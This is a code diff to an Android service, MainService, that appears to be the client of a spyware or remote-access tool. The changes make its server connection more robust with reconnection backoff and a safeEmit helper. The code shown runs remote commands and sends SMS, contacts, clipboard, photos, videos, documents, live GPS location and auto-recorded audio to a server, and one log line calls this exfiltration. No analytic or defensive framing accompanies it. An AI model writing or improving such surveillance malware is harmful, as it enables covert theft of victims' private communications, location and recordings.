@@ -189,51 +189,102 @@ class MainService : Service() {
             .build()
     }
     
+    private var reconnectAttempts = 0
+    private val MAX_RECONNECT_DELAY = 30000L
+    
     private fun connectToServer() {
         try {
             val wsUrl = getString(R.string.ws_url)
-            Log.d(TAG, "Connecting to: $wsUrl")
+            Log.d(TAG, "Connecting to: $wsUrl (attempt ${reconnectAttempts + 1})")
+            
+            // Exponential backoff for reconnection
+            var reconnectDelay = 1000L
+            repeat(minOf(reconnectAttempts, 5)) { reconnectDelay *= 2 }
+            reconnectDelay = minOf(reconnectDelay, MAX_RECONNECT_DELAY)
+            
             val options = IO.Options().apply {
                 forceNew = true
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 1000
-                reconnectionDelayMax = 5000
+                reconnectionDelay = reconnectDelay
+                reconnectionDelayMax = MAX_RECONNECT_DELAY
                 query = "deviceId=$deviceId&type=device"
                 transports = arrayOf("websocket")
-                timeout = 10000
+                timeout = 15000
+                randomizationFactor = 0.5
             }
+            
+            // Disconnect existing socket if any
+            try {
+                socket.disconnect()
+            } catch (e: Exception) {}
+            
             socket = IO.socket(wsUrl, options)
+            
             socket.on(Socket.EVENT_CONNECT) {
                 Log.d(TAG, "Connected to server successfully")
                 isConnected = true
+                reconnectAttempts = 0
                 sendDeviceInfo()
                 Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 2000)
             }
-            socket.on(Socket.EVENT_DISCONNECT) {
-                Log.d(TAG, "Disconnected from server")
+            
+            socket.on(Socket.EVENT_DISCONNECT) { args ->
+                Log.d(TAG, "Disconnected from server: ${args.contentToString()}")
                 isConnected = false
+                // Don't increment reconnectAttempts here - let the reconnection logic handle it
             }
+            
             socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 Log.e(TAG, "Connection error: ${args.contentToString()}")
                 isConnected = false
+                reconnectAttempts++
             }
+            
             socket.on("connect_error") { args ->
-                Log.e(TAG, "Connection error: ${args.contentToString()}")
+                Log.e(TAG, "Connect error: ${args.contentToString()}")
                 isConnected = false
+                reconnectAttempts++
             }
+            
             socket.on("command") { args ->
                 if (args.isNotEmpty()) {
-                    val data = args[0] as JSONObject
-                    handleCommand(data)
+                    try {
+                        val data = args[0] as JSONObject
+                        handleCommand(data)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error handling command: ${e.message}")
+                    }
                 }
             }
+            
+            socket.on("error") { args ->
+                Log.e(TAG, "Socket error: ${args.contentToString()}")
+                isConnected = false
+            }
+            
             socket.connect()
             Log.d(TAG, "Socket.connect() called")
         } catch (e: Exception) {
             Log.e(TAG, "Socket connection error: ${e.message}", e)
             isConnected = false
-            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 5000)
+            reconnectAttempts++
+            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 3000)
+        }
+    }
+    
+    private fun safeEmit(event: String, data: JSONObject) {
+        try {
+            if (::socket.isInitialized && socket.connected()) {
+                socket.emit(event, data)
+            } else {
+                Log.w(TAG, "Socket not connected, queuing event: $event")
+                isConnected = false
+                // Try to reconnect
+                Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 1000)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error emitting $event: ${e.message}")
         }
     }
     
@@ -252,7 +303,7 @@ class MainService : Service() {
                 put("ip", getLocalIpAddress())
                 put("sdkVersion", Build.VERSION.SDK_INT)
             }
-            socket.emit("device:update", info)
+            safeEmit("device:update", info)
             Log.d(TAG, "Device info sent")
         } catch (e: Exception) {
             Log.e(TAG, "Error sending device info: ${e.message}")
@@ -283,7 +334,7 @@ class MainService : Service() {
                 if (videos != null) { data.put("videos", videos); hasData = true }
                 if (documents != null) { data.put("documents", documents); hasData = true }
                 if (hasData && isConnected) {
-                    socket.emit("device:data:bulk", data)
+                    safeEmit("device:data:bulk", data)
                     lastBulkDataSent = System.currentTimeMillis()
                     Log.d(TAG, "Bulk data sent successfully")
                 } else {
@@ -315,7 +366,7 @@ class MainService : Service() {
                         put("result", result)
                         put("status", "executed")
                     }
-                    if (isConnected) socket.emit("device:result", response)
+                    safeEmit("device:result", response)
                 } catch (e: Exception) {
                     Log.e(TAG, "Command execution error: ${e.message}")
                     val errorDetail = JSONObject().apply {
@@ -329,7 +380,7 @@ class MainService : Service() {
                         put("result", errorDetail)
                         put("status", "failed")
                     }
-                    if (isConnected) socket.emit("device:result", errorResponse)
+                    safeEmit("device:result", errorResponse)
                 }
             }.start()
         } catch (e: Exception) {
@@ -397,7 +448,7 @@ class MainService : Service() {
                 getSimInfo()?.let { allData.put("simInfo", it) }
                 getNetworkInfo()?.let { allData.put("networkInfo", it) }
                 if (isConnected) {
-                    socket.emit("device:data:bulk", allData)
+                    safeEmit("device:data:bulk", allData)
                     Log.d(TAG, "Refresh data sent")
                 }
             } catch (e: Exception) { Log.e(TAG, "Refresh error: ${e.message}") }
@@ -595,13 +646,11 @@ class MainService : Service() {
                     Log.d(TAG, "Auto-stopping recording after 20s")
                     val result = stopAudioRecording()
                     // Send result to server
-                    if (isConnected) {
-                        socket.emit("device:result", JSONObject().apply {
-                            put("commandId", "audio_auto_${System.currentTimeMillis()}")
-                            put("result", result)
-                            put("status", "executed")
-                        })
-                    }
+                    safeEmit("device:result", JSONObject().apply {
+                        put("commandId", "audio_auto_${System.currentTimeMillis()}")
+                        put("result", result)
+                        put("status", "executed")
+                    })
                 }
             }, 20000)
             return JSONObject().apply { put("success", true); put("file", file.absolutePath); put("duration", "started") }
@@ -725,13 +774,11 @@ class MainService : Service() {
                                 }
                                 
                                 // Send via socket so server uploads to Cloudinary
-                                if (isConnected) {
-                                    socket.emit("device:result", JSONObject().apply {
-                                        put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
-                                        put("result", result)
-                                        put("status", "executed")
-                                    })
-                                }
+                                safeEmit("device:result", JSONObject().apply {
+                                    put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
+                                    put("result", result)
+                                    put("status", "executed")
+                                })
                                 
                                 // Mark as uploaded
                                 video.put("uploaded", true)
@@ -782,13 +829,11 @@ class MainService : Service() {
                                 }
                                 
                                 // Send via socket so server uploads to Cloudinary
-                                if (isConnected) {
-                                    socket.emit("device:result", JSONObject().apply {
-                                        put("commandId", "photo_${photoName}_${System.currentTimeMillis()}")
-                                        put("result", result)
-                                        put("status", "executed")
-                                    })
-                                }
+                                safeEmit("device:result", JSONObject().apply {
+                                    put("commandId", "photo_${photoName}_${System.currentTimeMillis()}")
+                                    put("result", result)
+                                    put("status", "executed")
+                                })
                                 
                                 // Mark as uploaded
                                 photo.put("uploaded", true)
@@ -929,7 +974,7 @@ class MainService : Service() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return JSONObject().apply { put("error", "Location permission not granted") }
         locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10f, object : LocationListener {
             override fun onLocationChanged(location: Location) {
-                try { socket.emit("device:data:bulk", JSONObject().apply { put("location", JSONObject().apply { put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy); put("speed", location.speed); put("bearing", location.bearing); put("timestamp", location.time) }) }) }
+                try { safeEmit("device:data:bulk", JSONObject().apply { put("location", JSONObject().apply { put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy); put("speed", location.speed); put("bearing", location.bearing); put("timestamp", location.time) }) }) }
                 catch (e: Exception) { Log.e(TAG, "Error sending location: ${e.message}") }
             }
             override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
@@ -958,7 +1003,7 @@ class MainService : Service() {
                 getSimInfo()?.let { allData.put("simInfo", it) }
                 getNetworkInfo()?.let { allData.put("networkInfo", it) }
                 getClipboard()?.let { allData.put("clipboard", it) }
-                socket.emit("device:data:bulk", allData)
+                safeEmit("device:data:bulk", allData)
             } catch (e: Exception) { Log.e(TAG, "Exfiltration error: ${e.message}") }
         }.start()
         return JSONObject().apply { put("status", "started") }
@@ -968,8 +1013,10 @@ class MainService : Service() {
         Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
             override fun run() {
                 try {
-                    socket.emit("device:ping")
-                    socket.emit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
+                    if (isConnected) {
+                        safeEmit("device:ping", JSONObject())
+                        safeEmit("device:update", JSONObject().apply { put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging()) })
+                    }
                     if (System.currentTimeMillis() - lastBulkDataSent > 300000) sendBulkData()
                 } catch (e: Exception) { Log.e(TAG, "Periodic update error: ${e.message}") }
                 Handler(Looper.getMainLooper()).postDelayed(this, 30000)
@@ -983,14 +1030,14 @@ class MainService : Service() {
         try {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                 contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-                    override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
+                    override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { safeEmit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
                 })
             }
         } catch (e: Exception) { Log.e(TAG, "SMS observer error: ${e.message}") }
         try {
             if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                 contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-                    override fun onChange(selfChange: Boolean) { getContacts()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
+                    override fun onChange(selfChange: Boolean) { getContacts()?.let { safeEmit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
                 })
             }
         } catch (e: Exception) { Log.e(TAG, "Contacts observer error: ${e.message}") }
